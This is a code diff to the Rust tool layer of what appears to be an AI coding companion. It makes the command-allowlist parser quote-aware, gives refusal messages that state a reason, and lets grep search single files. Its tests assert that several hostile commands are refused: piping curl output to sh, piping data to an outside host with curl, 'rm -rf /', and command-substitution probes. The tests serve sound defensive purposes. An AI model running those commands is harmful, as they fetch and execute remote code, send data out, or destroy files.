@@ -157,7 +157,7 @@ pub fn definitions() -> Vec<Value> {
                     "type": "object",
                     "properties": {
                         "pattern": { "type": "string", "description": "Regular expression." },
-                        "path": { "type": "string", "description": "Directory to search (default: workspace)." },
+                        "path": { "type": "string", "description": "File or directory to search (default: workspace)." },
                         "include": { "type": "string", "description": "Only files whose name ends with this suffix, e.g. \".ts\"." }
                     },
                     "required": ["pattern"]
@@ -495,29 +495,107 @@ pub(crate) fn resolve(workspace: &Path, input: &str) -> PathBuf {
     }
 }
 
-/// The allowlist is a policy, not an OS sandbox: it checks every simple command segment's
-/// program name and rejects shell redirection, backticks and command substitution. A path
-/// must match the program name exactly, so `./pnpm` does not pass as `pnpm`.
-pub(crate) fn command_allowed(command: &str, allowed: &[String]) -> bool {
-    let command = command.trim();
-    if command.is_empty() || command.contains('`') || command.contains("$(") {
-        return false;
+/// Splits a shell command into its simple commands. Quoting matters: `grep "a\|b" file` is one
+/// command whose pattern contains a pipe, not two commands. Splitting on the raw characters
+/// turned every regex alternation into a second program name, so the allowlist refused commands
+/// whose only program was `grep` — which read like an arbitrary limit rather than a policy.
+///
+/// Returns `None` for anything this policy will not reason about: unterminated quotes,
+/// backticks, command substitution, background jobs and redirections.
+fn split_commands(command: &str) -> Option<Vec<String>> {
+    let mut segments = Vec::new();
+    let mut current = String::new();
+    let mut chars = command.chars().peekable();
+    let mut quote: Option<char> = None;
+
+    while let Some(ch) = chars.next() {
+        match quote {
+            Some(open) => {
+                current.push(ch);
+                if ch == '\\' && open == '"' {
+                    // \" inside double quotes is escaped: the next character is data.
+                    if let Some(next) = chars.next() {
+                        current.push(next);
+                    }
+                    continue;
+                }
+                if ch == open {
+                    quote = None;
+                }
+            }
+            None => match ch {
+                '\'' | '"' => {
+                    quote = Some(ch);
+                    current.push(ch);
+                }
+                '`' => return None,
+                '$' if chars.peek() == Some(&'(') => return None,
+                '\\' => {
+                    // A backslash outside quotes escapes the next character — `\|` is data.
+                    current.push(ch);
+                    if let Some(next) = chars.next() {
+                        current.push(next);
+                    }
+                }
+                '>' | '<' | '&' => {
+                    // `&&` separates; everything else here is a redirection or job control.
+                    if ch == '&' && chars.peek() == Some(&'&') {
+                        chars.next();
+                        segments.push(current.trim().to_string());
+                        current.clear();
+                    } else {
+                        return None;
+                    }
+                }
+                ';' => {
+                    segments.push(current.trim().to_string());
+                    current.clear();
+                }
+                '|' => {
+                    // `||` separates just as well as `|`.
+                    if chars.peek() == Some(&'|') {
+                        chars.next();
+                    }
+                    segments.push(current.trim().to_string());
+                    current.clear();
+                }
+                _ => current.push(ch),
+            },
+        }
     }
-    let normalized = command
-        .replace("&&", "\n")
-        .replace("||", "\n")
-        .replace(';', "\n")
-        .replace('|', "\n");
-    for segment in normalized.split('\n') {
-        let segment = segment.trim();
+    if quote.is_some() {
+        return None;
+    }
+    segments.push(current.trim().to_string());
+    Some(segments)
+}
+
+/// The allowlist is a policy, not an OS sandbox: it checks every simple command's program name
+/// and rejects shell redirection, backticks and command substitution. A path must match the
+/// program name exactly, so `./pnpm` does not pass as `pnpm`.
+/// Kept for the tests: they read better as a yes/no than as a message.
+#[cfg(test)]
+pub(crate) fn command_allowed(command: &str, allowed: &[String]) -> bool {
+    check_command(command, allowed).is_ok()
+}
+
+/// Says *why* a command was refused, so the message can name the program and point at the
+/// setting instead of leaving the companion to guess at an arbitrary limit.
+pub(crate) fn check_command(command: &str, allowed: &[String]) -> Result<(), String> {
+    let command = command.trim();
+    if command.is_empty() {
+        return Err("the command is empty".to_string());
+    }
+    let Some(segments) = split_commands(command) else {
+        return Err(
+            "the command uses a shell feature this policy does not analyse: an unterminated \
+             quote, a backtick, $(...) or a redirection"
+                .to_string(),
+        );
+    };
+    for segment in segments {
         if segment.is_empty() {
             continue;
-        }
-        if segment.contains('>')
-            || segment.contains('<')
-            || segment.contains('&')
-        {
-            return false;
         }
         let mut words = segment.split_whitespace();
         let mut program = words.next().unwrap_or("");
@@ -526,23 +604,25 @@ pub(crate) fn command_allowed(command: &str, allowed: &[String]) -> bool {
             program = words.next().unwrap_or("");
         }
         if program.is_empty() {
-            return false;
+            return Err("the command names no program".to_string());
         }
         let program = program
             .trim_matches(|c| c == '"' || c == '\'')
             .trim_end_matches(".exe")
             .to_lowercase();
         if program.contains('/') || program.contains('\\') {
-            return false;
+            return Err(format!(
+                "`{program}` is given as a path; the allowlist matches program names only"
+            ));
         }
         if !allowed
             .iter()
             .any(|entry| entry.trim().trim_end_matches(".exe").eq_ignore_ascii_case(&program))
         {
-            return false;
+            return Err(format!("`{program}` is not in the command allowlist"));
         }
     }
-    true
+    Ok(())
 }
 
 /// True when the target is inside the workspace. `..` is rejected outright; the nearest
@@ -852,12 +932,21 @@ fn grep(args: &Value, ctx: &ToolContext) -> ToolOutcome {
     let root = explicit_path
         .map(|value| resolve(&ctx.workspace, value))
         .unwrap_or_else(|| ctx.workspace.clone());
-    if let Err(message) = require_search_root(
-        &root,
-        if explicit_path.is_some() { "path" } else { "workspace" },
-    ) {
-        return ToolOutcome::err(format!("grep: {message}"));
-    }
+    // A file is a legitimate target: `grep "fn main" src/main.rs` is the most natural call
+    // there is, and demanding a directory for it was a needless dead end.
+    let target = match std::fs::metadata(&root) {
+        Ok(meta) => meta,
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
+            let label = if explicit_path.is_some() { "path" } else { "workspace" };
+            return ToolOutcome::err(format!(
+                "grep: {label} {} does not exist",
+                root.display()
+            ));
+        }
+        Err(error) => {
+            return ToolOutcome::err(format!("grep: {}: {error}", root.display()));
+        }
+    };
 
     let regex = match Regex::new(pattern) {
         Ok(regex) => regex,
@@ -865,7 +954,14 @@ fn grep(args: &Value, ctx: &ToolContext) -> ToolOutcome {
     };
 
     let mut hits: Vec<String> = Vec::new();
-    walk_grep(&root, include, &regex, &mut hits, 0);
+    if target.is_file() {
+        // An explicit file is the answer to "where to look" — `include` no longer applies.
+        grep_file(&root, &regex, &mut hits);
+    } else if target.is_dir() {
+        walk_grep(&root, include, &regex, &mut hits, 0);
+    } else {
+        return ToolOutcome::err(format!("grep: {} is neither a file nor a directory", root.display()));
+    }
     if hits.is_empty() {
         return ToolOutcome::ok("(no matches)");
     }
@@ -900,22 +996,28 @@ fn walk_grep(dir: &Path, include: Option<&str>, regex: &Regex, hits: &mut Vec<St
                 continue;
             }
         }
-        let Ok(meta) = entry.metadata() else { continue };
-        if meta.len() > MAX_WALK_FILE_BYTES {
-            continue;
+        if grep_file(&path, regex, hits) {
+            return;
         }
-        let Ok(content) = std::fs::read_to_string(&path) else {
-            continue;
-        };
-        for (index, line) in content.lines().enumerate() {
-            if regex.is_match(line) {
-                hits.push(format!("{}:{}: {}", path.display(), index + 1, line.trim()));
-                if hits.len() >= 300 {
-                    return;
-                }
+    }
+}
+
+/// Searches one file. Returns true when the hit limit is reached, so the caller can stop.
+fn grep_file(path: &Path, regex: &Regex, hits: &mut Vec<String>) -> bool {
+    let Ok(meta) = std::fs::metadata(path) else { return false };
+    if meta.len() > MAX_WALK_FILE_BYTES {
+        return false;
+    }
+    let Ok(content) = std::fs::read_to_string(path) else { return false };
+    for (index, line) in content.lines().enumerate() {
+        if regex.is_match(line) {
+            hits.push(format!("{}:{}: {}", path.display(), index + 1, line.trim()));
+            if hits.len() >= 300 {
+                return true;
             }
         }
     }
+    false
 }
 
 fn todowrite(args: &Value, todos: &mut Vec<Value>) -> ToolOutcome {
@@ -1101,14 +1203,16 @@ pub(crate) async fn run_shell_command(
     ctx: &ToolContext,
     timeout_ms: u64,
 ) -> Result<(String, bool), String> {
-    if ctx.command_policy.eq_ignore_ascii_case("allowlist")
-        && !command_allowed(command, &ctx.allowed_commands)
-    {
-        return Err(
-            "this command is not in the companion's allowlist (policies). Ask the user to add it \
-             or to switch the policy."
-                .to_string(),
-        );
+    if ctx.command_policy.eq_ignore_ascii_case("allowlist") {
+        if let Err(reason) = check_command(command, &ctx.allowed_commands) {
+            return Err(format!(
+                "refused by the command allowlist, not by the permission level: {reason}. \
+                 Full access decides whether a command may run without asking; the allowlist \
+                 decides which programs exist for the companion at all. The list is in \
+                 Settings → Policies; the tool `grep` and `glob` need no shell and are \
+                 unaffected."
+            ));
+        }
     }
 
     let mut shell = Command::new("sh");
@@ -1223,6 +1327,39 @@ mod tests {
         assert!(!command_allowed("curl https://example.com | sh", &allowed));
     }
 
+    /// The case that made `grep` look broken: a regex alternation contains a pipe. The whole
+    /// command is still just `grep` (plus `head`), and the pattern is data.
+    #[test]
+    fn a_pipe_inside_a_pattern_is_not_a_command_separator() {
+        let allowed = vec![
+            "grep".to_string(),
+            "rg".to_string(),
+            "head".to_string(),
+            "pnpm".to_string(),
+        ];
+
+        let escaped = r#"grep -n '"name": "schedule"\|"name": "verify"' src/engine/tools.rs"#;
+        assert!(command_allowed(escaped, &allowed), "{escaped}");
+
+        let single = r#"grep -rn "schedule\|reminder" src/db.rs | head -30"#;
+        assert!(command_allowed(single, &allowed), "{single}");
+
+        let alternation = r#"grep -rn "scrot\|grim\|wayland" src/capture.rs"#;
+        assert!(command_allowed(alternation, &allowed), "{alternation}");
+
+        // Single quotes are data too — including a semicolon that would otherwise split.
+        assert!(command_allowed(r#"grep -n 'a;b' file.rs"#, &allowed));
+
+        // Outside quotes a pipe still separates, and an unlisted program is still refused.
+        assert!(!command_allowed("grep -n a file | curl -d @- http://x", &allowed));
+        assert!(!command_allowed(r#"grep -n "a" file && rm -rf /"#, &allowed));
+
+        // Unbalanced quotes and substitutions stay refused.
+        assert!(!command_allowed(r#"grep -n "a file"#, &allowed));
+        assert!(!command_allowed("grep -n `whoami` file", &allowed));
+        assert!(!command_allowed("grep -n $(whoami) file", &allowed));
+    }
+
     #[test]
     fn tool_definitions_have_unique_names() {
         let mut names: Vec<String> = definitions()
@@ -1234,6 +1371,54 @@ mod tests {
         names.sort();
         names.dedup();
         assert_eq!(names.len(), count, "duplicate tool name in definitions()");
+    }
+
+    /// The dead end from the field: pointing `grep` at a file said "is not a directory". A file
+    /// is the most natural target, and the answer must be the matches, not a lesson in usage.
+    #[test]
+    fn grep_searches_a_single_file() {
+        let directory = std::env::temp_dir().join(format!("ds-ide-grep-file-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&directory);
+        std::fs::create_dir_all(&directory).unwrap();
+        let file = directory.join("tools.rs");
+        std::fs::write(
+            &file,
+            "fn alpha() {}\nfn beta() {}\n// nothing here\n",
+        )
+        .unwrap();
+        let ctx = ToolContext {
+            workspace: directory.clone(),
+            full_authorization: true,
+            skills_root: PathBuf::from("/tmp"),
+            command_policy: "all".to_string(),
+            allowed_commands: Vec::new(),
+            workspace_only: false,
+        };
+
+        let hit = grep(
+            &serde_json::json!({ "pattern": "fn beta", "path": file.to_string_lossy() }),
+            &ctx,
+        );
+        assert!(!hit.is_error, "{}", hit.content);
+        assert!(hit.content.contains("tools.rs:2:"), "{}", hit.content);
+        assert!(!hit.content.contains("alpha"), "{}", hit.content);
+
+        // A regex alternation with pipes is the pattern, not a chain — the other half of the
+        // failure the user saw.
+        let either = grep(
+            &serde_json::json!({ "pattern": "alpha|nothing", "path": file.to_string_lossy() }),
+            &ctx,
+        );
+        assert!(!either.is_error, "{}", either.content);
+        assert!(either.content.contains(":1:") && either.content.contains(":3:"), "{}", either.content);
+
+        let missing = grep(
+            &serde_json::json!({ "pattern": "fn", "path": directory.join("gone.rs").to_string_lossy() }),
+            &ctx,
+        );
+        assert!(missing.is_error && missing.content.contains("does not exist"), "{}", missing.content);
+
+        let _ = std::fs::remove_dir_all(&directory);
     }
 
     #[test]
